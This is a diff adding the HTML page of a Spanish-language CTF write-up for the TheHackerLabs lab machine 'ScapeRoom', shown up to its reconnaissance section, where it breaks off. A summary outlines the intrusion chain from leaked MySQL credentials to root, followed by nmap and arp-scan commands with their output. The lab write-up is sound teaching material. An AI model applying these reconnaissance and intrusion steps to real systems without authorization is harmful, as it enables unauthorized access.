@@ -1,0 +1,1497 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ScapeRoom - TheHackerLabs · BerserkWings - Hacking Ético</title>
+<meta name="description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+
+<meta http-equiv="Content-Security-Policy"
+      content="default-src 'self';
+               img-src 'self';
+               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+               font-src 'self' https://fonts.gstatic.com;
+               script-src 'self' ;
+               connect-src 'self' ;
+               object-src 'none';
+               base-uri 'self';
+               form-action 'self';
+               upgrade-insecure-requests;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+
+<link rel="canonical" href="http://localhost:1313/THL-writeup-scapeRoom/">
+<link rel="icon" href="/assets/images/favicon.png">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@500;600;700&family=Inter:wght@400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/main.min.b51fce260bd224cda026ea0223adf133e0ce779edbb6c14d513c3f101c33a9ff.css" integrity="sha256-tR/OJgvSJM2gJuoCI63xM&#43;DOd57btsFNUTw/EBwzqf8=">
+
+
+<meta property="og:title" content="ScapeRoom - TheHackerLabs">
+<meta property="og:description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+<meta property="og:type" content="article">
+<meta property="og:image" content="http://localhost:1313/assets/images/THL-writeup-scapeRoom/scaperoom.png">
+
+
+
+</head>
+<body>
+  <header class="site-header">
+  <div class="wrap">
+    <a class="brand" href="/">
+      
+      <img class="brand-logo" src="http://localhost:1313/assets/images/masthead.png" alt="BerserkWings">
+      
+    </a>
+    <nav class="main-nav">
+      
+        <a href="/" >Inicio</a>
+      
+        <a href="/posts/" >Writeups</a>
+      
+        <a href="/categories/" >Categorías</a>
+      
+        <a href="/tags/" >Etiquetas</a>
+      
+        <a href="/buscador/" >Buscador</a>
+      
+        <a href="/acerca-de-mi/" >Acerca de mí</a>
+      
+    </nav>
+  </div>
+</header>
+
+  <main>
+    
+<canvas class="hero-matrix-bg hero-matrix-bg--dim" id="heroMatrixBg" aria-hidden="true"></canvas>
+<article class="post" id="top">
+  
+
+
+
+
+<aside class="side-profile">
+  <img class="side-avatar" src="http://localhost:1313/assets/images/avatar.png" alt="BerserkWings">
+  <div class="side-name">BerserkWings</div>
+  <div class="side-tagline">Aspirante a Pentester · CTF Player</div>
+
+  
+  <div class="side-platforms">
+    <span class="side-platform-badge">HTB: BerserkWings</span>
+    <span class="side-platform-badge">THL: BerserkWings</span>
+  </div>
+  
+
+  <div class="side-contact">
+    <span class="side-meta">📍 México</span>
+    
+    <a class="side-meta-link" href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">🔗 GitHub</a>
+    
+  </div>
+
+  
+  <div class="side-posts">
+    <div class="side-post-cards">
+      
+        
+      
+        
+      
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-devhub/">
+          <span class="side-post-card-title">DevHub</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-reactor/">
+          <span class="side-post-card-title">Reactor</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <div class="side-post-card is-current">
+          <span class="side-post-card-title">ScapeRoom</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </div>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-zapp/">
+          <span class="side-post-card-title">ZAPP</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-phantom/">
+          <span class="side-post-card-title">Phantom Robotics</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  
+
+  
+
+  
+
+
+</aside>
+
+
+  
+  
+  
+
+  <header class="post-header">
+    
+    <div class="post-meta">TheHackerLabs / Medium Machine</div>
+    
+    <h1>ScapeRoom - TheHackerLabs</h1>
+    <div class="post-meta">7 May 2026 · 21 min de lectura</div>
+  </header>
+
+  
+  <img class="post-cover" src="http://localhost:1313/assets/images/THL-writeup-scapeRoom/scaperoom.png" alt="ScapeRoom - TheHackerLabs">
+  
+
+  
+  <p class="post-lead">Esta fue una máquina algo complicada. Después de analizar los servicios de ambas interfaces y de ver que en ambas está lo mismo, elegimos una para aplicar las pruebas. Iniciamos analizando la página web activa en el puerto 80, pero al no encontrar algo que nos ayude más que una pista codificada en base64 y una página de PHP después de hacer Fuzzing, utilizamos Nikto para analizar la página web, siendo así que encontramos dos cabeceras que contienen un dominio y un subdominio. En el subdominio encontraremos una imagen que, al analizar sus metadatos, encontraremos una cadena de caracteres en base64 que, al decodificar, nos da las credenciales de acceso del servicio MySQL. Dentro del MySQL, descubrimos unas credenciales para ganar acceso a algún lado, pero la contraseña está encriptada. Analizamos los eventos del MySQL y descubrimos cómo se encriptó la contraseña, siendo que utilizamos una función para desencriptar esa contraseña y así logramos ganar acceso a un login de la página web, que nos muestra las credenciales de acceso para el SSH, pero será para el SSH de la segunda interfaz. Dentro del SSH, encontramos un archivo encriptado con GPG, que logramos crackear y vemos que contiene una pista. A su vez, vemos que se puede leer el historial de Bash del usuario actual, viendo así que se analizó el contenido de una biblioteca compartida (Shared Object) y después se autenticó para convertirse en Root. Seguimos esos pasos y vemos una cadena que resulta ser la contraseña del Root, logrando así escalar privilegios..</p>
+  
+
+  
+  <details class="post-tools">
+    <summary>🛠 Herramientas utilizadas</summary>
+
+    
+      
+      <ul><li><code>ping</code></li><li><code>nmap</code></li><li><code>wappalizer</code></li><li><code>echo</code></li><li><code>base64</code></li><li><code>ffuf</code></li><li><code>gobuster</code></li><li><code>nikto</code></li><li><code>curl</code></li><li><code>head</code></li><li><code>wget</code></li><li><code>exiftool</code></li><li><code>mysql</code></li><li><code>nxc</code></li><li><code>ssh</code></li><li><code>scp</code></li><li><code>gpg2john</code></li><li><code>JohnTheRipper</code></li><li><code>gpg</code></li><li><code>strings</code></li><li><code>su</code></li><li><code>chmod</code></li></ul>
+    
+  </details>
+  
+
+  
+  <details class="toc" id="indice" open>
+    <summary>📑 Índice</summary>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Hosts">Descubrimiento de Hosts</a></li>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#fuzz">Fuzzing</a></li>
+        <li><a href="#DNS">Descubriendo Dominio y Subdominio Ocultos en Cabeceras HTTP con Nikto</a>
+          <ul>
+            <li><a href="#metadatos">Analizando Metadatos de una Imagen y Ganando Acceso al Servicio MySQL</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#MySQL">Enumeración del Servicio MySQL y Desencriptando Contraseña Almacenada en Base de Datos para Ganar Acceso a Login Web y SSH</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#GPG">Crackeo de Archivo GPG con JohnTheRipper</a></li>
+        <li><a href="#preload">Leyendo Historial de Bash y Analizando Biblioteca Compartida (Shared Object) para Escalar Privilegios</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </details>
+  <aside class="side-toc">
+    <div class="side-toc-header">📑 Índice</div>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Hosts">Descubrimiento de Hosts</a></li>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#fuzz">Fuzzing</a></li>
+        <li><a href="#DNS">Descubriendo Dominio y Subdominio Ocultos en Cabeceras HTTP con Nikto</a>
+          <ul>
+            <li><a href="#metadatos">Analizando Metadatos de una Imagen y Ganando Acceso al Servicio MySQL</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#MySQL">Enumeración del Servicio MySQL y Desencriptando Contraseña Almacenada en Base de Datos para Ganar Acceso a Login Web y SSH</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#GPG">Crackeo de Archivo GPG con JohnTheRipper</a></li>
+        <li><a href="#preload">Leyendo Historial de Bash y Analizando Biblioteca Compartida (Shared Object) para Escalar Privilegios</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </aside>
+  
+
+  <div class="post-content">
+    <h2 id="Recopilacion">Recopilación de Información</h2>
+<h3 id="Hosts">Descubrimiento de Hosts</h3>
+<p>Hagamos un descubrimiento de hosts para encontrar a nuestro objetivo.</p>
+<p>Lo haremos primero con <strong>nmap</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sn 192.168.110.0/24
+</span></span><span style="display:flex;"><span>Starting Nmap 7.98 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-05-06 12:52 -0600
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> thlpwn.thl <span style="color:#f92672">(</span>192.168.110.10<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00090s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">256</span> IP addresses <span style="color:#f92672">(</span><span style="color:#ae81ff">9</span> hosts up<span style="color:#f92672">)</span> scanned in 12.61 seconds
+</span></span></code></pre></div><p>Vamos a probar la herramienta <strong>arp-scan</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>arp-scan -I eth0 -g 192.168.110.0/24
+</span></span><span style="display:flex;"><span>Interface: eth0, type: EN10MB, MAC: XX, IPv4: Tu_IP
+</span></span><span style="display:flex;"><span>Starting arp-scan 1.10.0 with <span style="color:#ae81ff">256</span> hosts <span style="color:#f92672">(</span>https://github.com/royhills/arp-scan<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>192.168.100.22	XX  PCS Systemtechnik GmbH
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">9</span> packets received by filter, <span style="color:#ae81ff">0</span> packets dropped by kernel
+</span></span><span style="display:flex;"><span>Ending arp-scan 1.10.0: <span style="color:#ae81ff">256</span> hosts scanned in 2.142 seconds <span style="color:#f92672">(</span>119.51 hosts/sec<span style="color:#f92672">)</span>. <span style="color:#ae81ff">9</span> responded
+</span></span></code></pre></div><p><strong>Importante</strong>: Recordemos que hay una segunda interfaz configurada en la máquina víctima, entonces, vamos a hacer el mismo porceso.</p>
+<p>Probemos primero con <strong>nmap</strong> en la segunda inferfaz:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sn 10.0.2.0/24
+</span></span><span style="display:flex;"><span>Starting Nmap 7.98 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-05-07 16:34 -0600
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.0.1.10
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00063s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">256</span> IP addresses <span style="color:#f92672">(</span><span style="color:#ae81ff">4</span> hosts up<span style="color:#f92672">)</span> scanned in 10.93 seconds
+</span></span></code></pre></div><p>Vamos a probar la herramienta <strong>arp-scan</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>arp-scan -I eth1 -g 10.0.1.0/24
+</span></span><span style="display:flex;"><span>Interface: eth1, type: EN10MB, MAC: XX, IPv4: Tu_IP
+</span></span><span style="display:flex;"><span>Starting arp-scan 1.10.0 with <span style="color:#ae81ff">256</span> hosts <span style="color:#f92672">(</span>https://github.com/royhills/arp-scan<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>10.0.1.10  XX  PCS Systemtechnik GmbH
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span> packets received by filter, <span style="color:#ae81ff">0</span> packets dropped by kernel
+</span></span><span style="display:flex;"><span>Ending arp-scan 1.10.0: <span style="color:#ae81ff">256</span> hosts scanned in 2.007 seconds <span style="color:#f92672">(</span>127.55 hosts/sec<span style="color:#f92672">)</span>. <span style="color:#ae81ff">3</span> responded
+</span></span></code></pre></div><p>Encontramos nuestros objetivos y son: <code>192.168.110.10</code> y <code>10.0.1.10</code>.</p>
+<p><strong>Nota</strong>: En ambos objetivos tienen los mismos puertos y servicios, por lo que de momento nos enfocaremos en solo 1, pero quizá esto cambie más adelante.</p>
+<h3 id="Ping">Traza ICMP</h3>
+<p>Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ping -c <span style="color:#ae81ff">4</span> 192.168.110.10
+</span></span><span style="display:flex;"><span>PING 192.168.110.10 <span style="color:#f92672">(</span>192.168.110.10<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.110.10: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>1.53 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.110.10: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>0.866 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.110.10: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>1.72 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.110.10: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>0.562 ms
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- 192.168.110.10 ping statistics ---
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span> packets transmitted, <span style="color:#ae81ff">4</span> received, 0% packet loss, time 3034ms
+</span></span><span style="display:flex;"><span>rtt min/avg/max/mdev <span style="color:#f92672">=</span> 0.562/1.169/1.719/0.472 ms
+</span></span></code></pre></div><p>Por el TTL sabemos que la máquina usa <strong>Linux</strong>, hagamos los escaneos de puertos y servicios.</p>
+<h3 id="Puertos">Escaneo de Puertos</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn 192.168.110.10 -oG allPorts
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.98 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-05-06 12:53 -0600
+</span></span><span style="display:flex;"><span>Initiating ARP Ping Scan at 12:53
+</span></span><span style="display:flex;"><span>Scanning 192.168.110.10 <span style="color:#f92672">[</span><span style="color:#ae81ff">1</span> port<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Completed ARP Ping Scan at 12:53, 0.06s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> total hosts<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 12:53
+</span></span><span style="display:flex;"><span>Scanning 192.168.110.10 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>SYN Stealth Scan Timing: About 50.00% <span style="color:#66d9ef">done</span>; ETC: 12:55 <span style="color:#f92672">(</span>0:00:37 remaining<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 192.168.110.10
+</span></span><span style="display:flex;"><span>Discovered open port 22/tcp on 192.168.110.10
+</span></span><span style="display:flex;"><span>Discovered open port 3306/tcp on 192.168.110.10
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 12:55, 75.76s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.110.10
+</span></span><span style="display:flex;"><span>Host is up, received arp-response <span style="color:#f92672">(</span>0.00087s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2026-05-06 12:53:50 CST <span style="color:#66d9ef">for</span> 75s
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">53054</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>, <span style="color:#ae81ff">12478</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE REASON
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh     syn-ack ttl <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>80/tcp   open  http    syn-ack ttl <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>3306/tcp open  mysql   syn-ack ttl <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 75.96 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">124832</span> <span style="color:#f92672">(</span>5.493MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">12484</span> <span style="color:#f92672">(</span>499.368KB<span style="color:#f92672">)</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-p-</em></td>
+					<td>Para indicarle un escaneo en ciertos puertos.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;open</em></td>
+					<td>Para indicar que aplique el escaneo en los puertos abiertos.</td>
+			</tr>
+			<tr>
+					<td><em>-sS</em></td>
+					<td>Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;min-rate</em></td>
+					<td>Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).</td>
+			</tr>
+			<tr>
+					<td><em>-vvv</em></td>
+					<td>Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-n</em></td>
+					<td>Para indicar que no se aplique resolución dns para agilizar el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-Pn</em></td>
+					<td>Para indicar que se omita el descubrimiento de hosts.</td>
+			</tr>
+			<tr>
+					<td><em>-oG</em></td>
+					<td>Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Tenemos 3 puertos abiertos, pero es curioso ver el <strong>puerto 3306</strong>, que es del <strong>servicio MySQL</strong>, que esté expuesto.</p>
+<h3 id="Servicios">Escaneo de Servicios</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sCV -p 22,80,3306 192.168.110.10 -oN targeted
+</span></span><span style="display:flex;"><span>Starting Nmap 7.98 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-05-06 12:55 -0600
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> thlpwn.thl <span style="color:#f92672">(</span>192.168.110.10<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00100s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 71:72:6f:9a:ba:7f:73:1d:bc:30:36:ee:9d:62:e8:88 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> cd:0b:5b:55:41:13:bc:1c:d1:27:81:77:ff:6d:33:15 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 63:29:44:28:7d:5a:db:39:29:47:2f:a5:1d:17:fc:07 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp   open  http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Lecturas de Sensores
+</span></span><span style="display:flex;"><span>3306/tcp open  mysql   MySQL 8.0.40-0ubuntu0.20.04.1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>MySQL_Server_8.0.39_Auto_Generated_Server_Certificate
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-11-01T16:51:24
+</span></span><span style="display:flex;"><span>|_Not valid after:  2034-10-30T16:51:24
+</span></span><span style="display:flex;"><span>| mysql-info: 
+</span></span><span style="display:flex;"><span>|   Protocol: <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>|   Version: 8.0.40-0ubuntu0.20.04.1
+</span></span><span style="display:flex;"><span>|   Thread ID: <span style="color:#ae81ff">26</span>
+</span></span><span style="display:flex;"><span>|   Capabilities flags: <span style="color:#ae81ff">65535</span>
+</span></span><span style="display:flex;"><span>|   Some Capabilities: InteractiveClient, LongPassword, FoundRows, ConnectWithDatabase, SupportsTransactions, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, SupportsCompression, SupportsLoadDataLocal, ODBCClient, LongColumnFlag, Support41Auth, IgnoreSigpipes, DontAllowDatabaseTableColumn, SwitchToSSLAfterHandshake, Speaks41ProtocolOld, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
+</span></span><span style="display:flex;"><span>|   Status: Autocommit
+</span></span><span style="display:flex;"><span>|   Salt: B<span style="color:#ae81ff">\x</span>0C<span style="color:#ae81ff">\x</span>12lF+6	b%!fzrR%X<span style="color:#ae81ff">\x</span>0Bi,
+</span></span><span style="display:flex;"><span>|_  Auth Plugin Name: caching_sha2_password
+</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>MAC Address: 08:00:27:7C:59:CE <span style="color:#f92672">(</span>Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 7.93 seconds
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-sC</em></td>
